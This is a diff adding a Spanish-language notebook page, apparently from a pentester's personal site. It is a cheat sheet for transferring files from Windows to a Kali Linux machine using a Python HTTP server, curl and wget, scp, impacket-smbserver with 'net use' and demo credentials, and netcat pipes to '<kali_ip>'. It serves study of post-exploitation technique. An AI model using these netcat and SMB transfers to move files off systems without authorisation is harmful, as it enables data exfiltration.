@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Windows -> Linux | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="windows-linux">
+          <div class="note-tabbar">
+            <span>Windows -> Linux</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Transferencia de Archivos/Windows -> Linux</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">transferencia de archivos / windows a linux</p>
+            <h2>Windows -> Linux</h2>
+
+            <section class="code-card">
+              <h3>Python Server</h3>
+              <pre><code># Desde Window
+python -m http.server 80
+
+# Desde Linux con curl
+curl -O http://ip_window/archivo.txt
+# Desde Linux con wget
+wget http://ip_window/archivo.txt</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>SCP</h3>
+              <pre><code>scp &lt;user&gt;@&lt;ip_target&gt;:&#x27;C:/path/file.pdf&#x27; file.pdf</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>impacket-smbserver</h3>
+              <pre><code># Desde Linux
+impacket-smbserver smbFolder $(pwd) -smb2support 
+# Desde Windows
+copy &quot;C:\Users\alvar\Pictures\Joker.jpg&quot; \\&lt;kali_ip&gt;\smbFolder\</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>impacket-smbserver con unidades del almacenamiento</h3>
+              <pre><code># Desde Linux
+# Abrimos servidor smb
+impacket-smbserver &lt;smbFolder&gt; $(pwd) -smb2support 
+
+impacket-smbserver &lt;smbFolder&gt; $(pwd) -smb2support -username alvaro -password alvaro123 # Con contraseña
+
+# Desde Windows
+# Nos conectamos al servidor smb
+net use L: \\&lt;ip_linux&gt;\&lt;smbFolder&gt; /user:alvaro alvaro123
+# Mandamos el recurso que queramos
+copy &quot;C:\Users\alvar\Pictures\Joker.jpg&quot; L:\
+# Lo desmontamos
+net use L: /delete</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Netcat</h3>
+              <pre><code># Windows PowerShell
+Get-Content .\file -Raw | .\nc.exe &lt;kali_ip&gt; 4443
+# Windows CMD
+nc.exe  &lt;kali_ip&gt; 8080 &lt; file
+# Kali
+nc -nlvp 443 &gt; file</code></pre>
+            </section>
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>transferencia_archivos</span>
+              <span>windows</span>
+              <span>linux</span>
+              <span>smb</span>
+              <span>netcat</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
